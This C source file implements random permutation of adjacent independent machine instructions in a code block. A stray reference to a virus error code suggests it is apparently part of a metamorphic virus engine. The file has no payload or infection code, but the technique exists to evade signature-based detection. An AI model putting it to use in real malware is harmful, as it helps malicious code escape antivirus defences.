#include <stdbool.h>
#include <stddef.h>
#include "accessors.h"
#include "disasm.h"
#include "blocks.h"
#include "utils.h"
#include "syscalls.h"
#include "errors.h"
#include "compiler_utils.h"
#include "log_print_operands.h"

static bool	want_to_permutate(uint64_t *seed)
{
	return random(seed) % 2;
}

static bool	can_permutate(const struct operand *a, const struct operand *b)
{
	// TODO: UNKNOWN & NONE exception
	bool	same_dest      = !!(a->dst & b->dst);
	bool	a_dst_is_b_src = !!(a->dst & b->src);
	bool	b_dst_is_a_src = !!(b->dst & a->src);

	if (same_dest || a_dst_is_b_src || b_dst_is_a_src)
	{
		return false;
	}
	return true;
}

static void	permutate_neighbors(struct operand *a, struct operand *b)
{
	// small addresses first
	if (a->addr > b->addr)
	{
		permutate_neighbors(b, a);
		return ;
	}
	// check if actually neighbours!
	if (a->addr + a->length != b->addr)
	{
		// sys_exit(errors(ERR_VIRUS, _ERR_IMPOSSIBLE));
		return ;
	}

	// backup 1st
	uint8_t	swap_code[INSTRUCTION_MAXLEN];
	memcpy(swap_code, a->addr, a->length);

	// copy b in a
	memcpy(a->addr, b->addr, b->length);

	// copy a after that
	void	*after_b = a->addr + b->length;
	memcpy(after_b, swap_code, a->length);

	// reassign addresses
	b->addr = a->addr;
	a->addr = after_b;

	// swap instructions array position
	struct operand swap;
	swap = *a;
	*a = *b;
	*b = swap;
}

static void	maybe_permutate(struct operand *a, struct operand *b, uint64_t *seed)
{
	if (want_to_permutate(seed) && can_permutate(a, b))
	{
		permutate_neighbors(a, b);
	}
}

/* -------------------------------------------------------------------------- */

static bool	are_labels(const struct label *labels, size_t nlabels,
			struct operand a, struct operand b)
{
	for (size_t i = 0; i < nlabels; i++)
	{
		struct label	label = labels[i];

		if (label.location == a.addr || label.location == b.addr)
		{
			return true;
		}
	}
	return false;
}

static bool	has_untouchable_registers(struct operand a, struct operand b)
{
	if ((a.src | a.dst | b.src | b.dst) & (RIP | RSP))
	{
		return true;
	}
	return false;
}

/* -------------------------------------------------------------------------- */

size_t		count_instructions(void *code, size_t codelen)
{
	size_t	ninsts = 0;

	while (codelen)
	{
		size_t	instruction_length = disasm_length(code, codelen);

		if (instruction_length == 0)
			return 0; // TODO

		codelen -= instruction_length;
		ninsts  += 1;
	}
	return ninsts;
}

/*
** This function never fails : worst case senario, it does nothing
*/
bool		permutate_instructions(struct safe_ptr ref, uint64_t seed)
{
	size_t	ninsts = count_instructions(ref.ptr, ref.size);

	struct block_allocation	block_memory;
	struct operand		insts[ninsts];

	if (!disasm_block(&block_memory, ref))
		return errors(ERR_THROW, _ERR_T_PERMUTATE_INSTRUCTIONS);

	struct label	*labels = block_memory.blocks[0].labels;
	size_t		nlabels = block_memory.blocks[0].nlabels;

	ninsts = disasm_operands(insts, ninsts, ref.ptr, ref.size);

	debug_print_operands(insts, ninsts);

	for (size_t i = 0; i < 1000; i++)
	{
		uint64_t	rand = random_inrange(&seed, 0, ninsts - 2);

		if (are_labels(labels, nlabels, insts[rand], insts[rand + 1])
		|| has_untouchable_registers(insts[rand], insts[rand + 1]))
		{
			continue;
		}
		maybe_permutate(&insts[rand], &insts[rand + 1], &seed);
	}
	return true;
}
